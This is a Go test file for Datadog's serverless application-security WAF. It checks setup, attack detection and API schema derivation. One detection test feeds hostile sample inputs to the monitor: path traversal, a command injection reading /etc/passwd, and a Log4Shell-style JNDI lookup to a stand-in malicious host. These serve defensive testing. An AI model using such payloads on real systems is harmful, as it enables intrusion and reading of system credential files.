// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

package appsec

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"testing"

	waf "github.com/DataDog/go-libddwaf/v2"

	"github.com/stretchr/testify/require"
)

func init() {
	os.Setenv("DD_APPSEC_WAF_TIMEOUT", "1m")
}

func TestNew(t *testing.T) {
	for _, appsecEnabled := range []bool{true, false} {
		appsecEnabledStr := strconv.FormatBool(appsecEnabled)
		t.Run(fmt.Sprintf("DD_SERVERLESS_APPSEC_ENABLED=%s", appsecEnabledStr), func(t *testing.T) {
			t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", appsecEnabledStr)
			lp, err := New(nil)
			if err := wafHealth(); err != nil {
				if ok, _ := waf.SupportsTarget(); ok {
					// host should be supported by appsec, error is unexpected
					require.NoError(t, err)
				} else {
					// host not supported by appsec
					require.Error(t, err)
				}
				return
			}

			require.NoError(t, err)
			if appsecEnabled {
				require.NotNil(t, lp)
			} else {
				require.Nil(t, lp)
			}
		})
	}
}

func TestMonitor(t *testing.T) {
	if err := wafHealth(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Run("events-detection", func(t *testing.T) {
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()

		uri := "/path/to/resource/../../../../../database.yml.sqlite3"
		addresses := map[string]interface{}{
			"server.request.uri.raw": uri,
			"server.request.headers.no_cookies": map[string][]string{
				"user-agent": {"sql power injector"},
			},
			"server.request.query": map[string][]string{
				"query": {"$http_server_vars"},
			},
			"server.request.path_params": map[string]string{
				"proxy": "/path/to/resource | cat /etc/passwd |",
			},
			"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
		}
		res := asm.Monitor(addresses)
		require.NotNil(t, res)
		require.True(t, res.HasEvents())
	})

	t.Run("api-security", func(t *testing.T) {
		t.Setenv("DD_API_SECURITY_REQUEST_SAMPLE_RATE", "1.0")
		t.Setenv("DD_EXPERIMENTAL_API_SECURITY_ENABLED", "true")
		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
		asm, err := newAppSec()
		require.NoError(t, err)
		defer asm.Close()
		for _, tc := range []struct {
			name       string
			pathParams map[string]any
			schema     string
		}{
			{
				name: "string",
				pathParams: map[string]any{
					"param": "string proxy value",
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[8]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "int",
				pathParams: map[string]any{
					"param": 10,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[4]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "float",
				pathParams: map[string]any{
					"param": 10.0,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[16]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "bool",
				pathParams: map[string]any{
					"param": true,
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[2]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "record",
				pathParams: map[string]any{
					"param": map[string]any{"recordKey": "recordValue"},
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[{"recordKey":[8]}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "array",
				pathParams: map[string]any{
					"param": []any{"arrayVal1", 10, false, 10.0},
				},
				schema: `{"_dd.appsec.s.req.params":[{"param":[[[2],[16],[4],[8]],{"len":4}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
			{
				name: "vin-scanner",
				pathParams: map[string]any{
					"vin": "AAAAAAAAAAAAAAAAA",
				},
				schema: `{"_dd.appsec.s.req.params":[{"vin":[8,{"category":"pii","type":"vin"}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
			},
		} {
			t.Run(tc.name, func(t *testing.T) {
				res := asm.Monitor(map[string]any{
					"server.request.path_params": tc.pathParams,
					"server.request.query": map[string][]string{
						"query": {"$http_server_vars"},
					},
				})
				require.NotNil(t, res)
				require.True(t, res.HasDerivatives())
				schema, err := json.Marshal(res.Derivatives)
				require.NoError(t, err)
				require.Equal(t, tc.schema, string(schema))
			})
		}
	})
}
